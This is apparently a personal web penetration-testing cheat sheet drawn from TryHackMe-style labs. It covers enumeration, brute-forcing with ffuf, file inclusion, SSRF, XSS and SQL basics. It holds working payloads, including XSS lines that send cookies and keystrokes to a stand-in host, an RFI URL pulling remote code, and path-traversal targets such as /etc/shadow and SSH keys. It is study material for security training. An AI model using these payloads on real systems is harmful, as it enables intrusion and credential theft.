# Web pentest
## Content discovery
- review source code
- review files
- review actions in network
- robots.txt
- sitemap.xml
- framework detection
    - favicon inspection (`curl <url/favicon.ico | md5sum>` and compare it to [owasp_db](https://wiki.owasp.org/index.php/OWASP_favicon_database))
    - wappalyzer extension
    - source code/headers (`curl -v`)
- dorks
    - site:
    - inurl:
    - filetype:
    - intitle:
- wayback machine [link](https://archive.org/web/) (old versions of webpages)
- search for site/company name on github
- s3-buckets
S3 buckets could be detected with tools, by reviewing source code or by looking via `{name}.s3.amazonaws.com`, where name could be company name combined with smth like -assets, -www, -public, -private etc.
- tools:
[wordlists](https://github.com/danielmiessler/SecLists), `ffuf`, `dirb`, `gobuster`, `dirsearch` (favorite)  

## Subdomain enum
### OSINT
[crt.sh](http://crt.sh/)  
[ctsearch](https://ui.ctsearch.entrust.com/ui/ctsearchui)  
Dork: `-site:www.domain.com site:*.domain.com`  
This dork will reveal all subdomains except www. Could be combined with another exclusions  

### bruteforce
[dnsrecon](https://github.com/darkoperator/dnsrecon)  
`dnsrecon -t brt -d <host>`

### virtual hosts
some hosts could appear only on local machine (in /etc/hosts for example). In such case server understands what exact host we are looking by looking at `Host` header  
So we can tamper it to access internal hosts
```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/namelist.txt -H "Host: FUZZ.domain.com" -u "<url>"
```
Also we need to filter output with `-fs <size of page>`  

## Authentication bypass
### Username enum
We can use ffuf to enum existing usernames  
`ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.128.69/customers/signup -mr "username already exists"`  
`mr` is 'match http response data'

### Brute Force
We can use valid usernames detected and used password wordlist for effective bruteforce
```
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200
```
`W1` and `W2` are used to specify fuzzing point in place of `FUZZ` keyword  
Multiople wordlists are set with `-w` parameter and separated with coma  
`-fc` is used to detect HTTP responses other than 200  

### Logic Flaw
```
if( url.substr(0,6) === '/admin') {
    # Code to check user is an admin
} else {
    # View Page
}
```
Because the above PHP code example uses three equals signs (`===`), it's looking for an exact match on the string, including the same letter casing. The code presents a logic flaw because an unauthenticated user requesting `/adMin` will not have their privileges checked and have the page displayed to them, totally bypassing the authentication checks.  

#### Reset password logic flaw
For example if we need to set e-mail for password reset, we can try to set additional e-mail for sending request on another e-mail:
```
curl 'http://10.10.174.105/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'
```
Here we set normal e-mail in url, but also add additional url in requests's payload data  

### Cookie Tampering
Examine and try to decode/crack hash of cookies in order to change them  

## IDORs
Check for idors  
If ids are unpredictable, we can sue two accounts and try to swap objects between them.  
Also some parameters could be hidden or unused. We can try to detect them with parameter mining  

## File Inclusion
### Path traversal
```
http://webapp.thm/get.php?file=../../../../etc/passwd
http://webapp.thm/get.php?file=../../../../boot.ini
http://webapp.thm/get.php?file=../../../../windows/win.ini
```
Files that could be searched in place of `/etc/passwd`:
```
/etc/issue
/etc/profile
/proc/version
/etc/passwd
/etc/shadow
/root/.bash_history
/var/log/dmessage
/var/mail/root
/root/.ssh/id_rsa
/var/log/apache2/access.log
C:\boot.ini
```
PHP has function that often leads to path traversal. It's `file_get_contents`.  

### LFI
For example if we have opportunity to choos lang of page, it could call .php file with contents of such lang and this could be a vector for LFI:
```
<?PHP 
	include($_GET["lang"]);
?>
```
Request could be like this:
```
http://webapp.thm/index.php?lang=EN.php
```
And EN.php is changed to a file of our interest.  
If dev decided to ahrdcode some directory, we can bypass it with dir traversal:
```
<?PHP 
	include("languages/". $_GET['lang']); 
?>
```

```
http://webapp.thm/index.php?lang=../../../../etc/passwd
```
If we have restriction with file extension (for example it's added in the code), we can use null byte to bypass it `%00`  
This trick is fxied in PHP 5.3.4 and above  
If files are filtered, we can try to add `/.` at the end of requested file to trick file filtering pattern:
```
http://webapp.thm/index.php?lang=/etc/passwd/.
```
If `../` is cutted out, we can use `....//`  
If we are forced to specify directory, we can use directory specification + directory traversal:
```
?lang=languages/../../../../../etc/passwd
```

### RFI
In case of PHP this vuln is based on allowing an attacker to place external URL into `include` function.  
One requirement for RFI is that the `allow_url_fopen` option needs to be `on`  
```
http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt
```
Dangerous PHP funcs are `allow_url_fopen` and `allow_url_include`  
Entry points could be via GET POST COOKIE or Host header

## SSRF
SSRF request could be splitted by adding `&` to parameters. For example:
```
https://website.thm/item/2?server=attacker.website.thm/flag?id=9&x=
```
We close the request with `&x` to trim potential pre-defined parameters.  
We can try to perform SSRF with elements such as avatars. For example if we see avatar which source is `assets/avatar.png`, we can try to change it via inspect function and then view page source. For example we can change it to some unaccessible url such as `/private`. If it doesn't work, we can try to combine it with path traversal and use smth like `x../private`  

## XSS
```
<script>alert()</script>
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>  - keylogger
```

Also we can call some arbitrary function with xss:
```
<script>user.changeEmail('attacker@hacker.thm');</script>
```

XSS Polyglt (used to bypass filters):
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```

## SQLi
```
select * from users where username like 'a%';           //starts with a
select * from users where username like '%n';           //ends with n
```

Rule for UNION select:  
UNION statement must retrieve the same number of columns in each SELECT statement, the columns have to be of a similar data type, and the column order has to be the same.  

### insert
```
insert into users (username,password) values ('bob','password123');
```

### update
```
update users SET username='root',password='pass123' where username='admin';
```

### delete
(delete row)
```
delete from users where username='martin';
```

### injection
injection could be done with not only `'`, but also with inserting `;--`, where 4 means and of the statement